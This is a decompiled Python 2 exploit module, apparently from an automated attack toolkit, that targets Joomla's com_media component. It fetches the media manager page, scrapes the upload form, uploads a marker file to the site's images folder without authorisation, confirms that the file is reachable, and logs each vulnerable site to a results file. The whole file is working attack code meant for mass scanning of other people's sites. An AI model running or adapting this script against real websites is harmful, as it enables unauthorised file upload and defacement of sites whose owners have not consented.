# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\com_media.py
import requests
import re
from Exploits import printModule
TextindeX = 'files/vuln.txt'

def Exploit(site):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0'}
    sess = requests.session()
    try:
        GET = sess.get('http://' + site + '/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=', timeout=10, headers=headers)
        if 'task=file.upload' in str(GET.content):
            try:
                Uploader = re.findall('action="(.*)" id="uploadForm"', str(GET.content))[0]
                if Uploader.startswith('http://'):
                    Uploader = Uploader.replace('http://', '')
                else:
                    if Uploader.startswith('https://'):
                        Uploader = Uploader.replace('https://', '')
                    POSTDATA = {'Filedata[]': open(TextindeX, 'rb')}
                    sess.post('http://' + Uploader, files=POSTDATA, headers=headers, timeout=10)
                    CheckIndex = requests.get('http://' + site + '/images/vuln.txt', timeout=10, headers=headers).content
                    if 'Vuln!!' in str(CheckIndex):
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.txt\n')
                        return printModule.returnYes(site, 'N/A', 'Com_Media', 'Joomla')
                return printModule.returnNo(site, 'N/A', 'Com_Media', 'Joomla')
            except:
                return printModule.returnNo(site, 'N/A', 'Com_Media', 'Joomla')

        else:
            return printModule.returnNo(site, 'N/A', 'Com_Media', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_Media', 'Joomla')